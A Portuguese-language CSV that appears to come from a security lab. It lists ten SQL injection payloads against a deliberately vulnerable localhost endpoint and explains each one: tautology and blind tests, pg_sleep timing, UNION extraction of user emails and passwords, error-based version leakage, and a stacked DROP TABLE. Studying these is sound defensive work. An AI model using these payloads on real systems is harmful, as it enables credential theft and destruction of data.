1,http://localhost:8080/products/vulnerable/1 OR 1=1 --,"Bypass de Lógica (Tautologia): ""Busque o produto 1 OU onde 1=1"". Como 1=1 é sempre verdadeiro, a consulta WHERE se torna verdadeira para todas as linhas. Retorna todos os produtos."
2,http://localhost:8080/products/vulnerable/1 AND 1=1 --,"Teste Cego (Verdadeiro): ""Busque o produto 1 E onde 1=1"". O resultado é verdadeiro (true AND true). A API retorna o produto 1, como esperado. O atacante usa isso como ""controle""."
3,http://localhost:8080/products/vulnerable/1 AND 1=2 --,"Teste Cego (Falso): ""Busque o produto 1 E onde 1=2"". O resultado é falso (true AND false). A API não retorna nada. Se [2] funcionar e [3] falhar, a vulnerabilidade está 100% confirmada."
4,http://localhost:8080/products/vulnerable/1 AND 1=(pg_sleep(5)) --,"Teste Cego de Tempo (Postgres): ""Busque o produto 1 E... espere 5 segundos"". Se a API congelar por 5 segundos e depois retornar o produto 1, o atacante sabe que o banco executou o comando pg_sleep(5)."
5,"http://localhost:8080/products/vulnerable/999 UNION SELECT NULL, NULL, NULL, NULL, NULL --","Roubo de Dados (Etapa 1: Adivinhar Colunas): ""Busque o produto 999 (que não existe) E 'grude' (UNION) um resultado falso com 5 colunas de NULL"". O atacante fica testando o número de NULLs (4, 5, 6...) até a página parar de dar erro. Isso revela o número de colunas."
6,"http://localhost:8080/products/vulnerable/999 UNION SELECT id, name, email, password, NULL FROM users --","Roubo de Dados (Etapa 2: O Ataque): ""Busque o produto 999 E 'grude' o ID, Nome, Email e Senha da tabela users"". Este é o ataque real. A API vai retornar os dados dos usuários no lugar dos produtos. (Presume 5 colunas e uma tabela users)."
7,http://localhost:8080/products/vulnerable/1 AND 1=(SELECT CAST(version() AS INT)) --,"Vazamento de Erro (Postgres): ""Busque o produto 1 E... tente converter a string da versão do banco (ex: ""PostgreSQL 14.5"") em um número"". Isso falha e o banco vaza a versão no erro (ex: invalid syntax for type integer: ""PostgreSQL 14.5"")."
8,http://localhost:8080/products/vulnerable/1; DROP TABLE users --,"Múltiplos Comandos (Ataque Catastrófico): ""Busque o produto 1. Fim do comando (;). Agora, execute um novo comando: DROP TABLE users"". FELIZMENTE, a maioria dos drivers de banco (JDBC) bloqueia isso por padrão, mas é o teste de maior impacto."
9,http://localhost:8080/products/vulnerable/1+1,"Execução de Código (Simples): ""Busque o produto onde id = 1+1"". O banco calcula e busca o id = 2. Isso prova que a entrada não é tratada como um simples número, mas como uma expressão a ser executada."
10,http://localhost:8080/products/vulnerable/1 OR 'a'='a' --,"Tautologia (Alternativa): ""Busque o produto 1 OU onde 'a'='a'"". Mesma lógica do #1, mas usando strings. Isso pode ser útil para contornar filtros (WAFs) que bloqueiam 1=1."
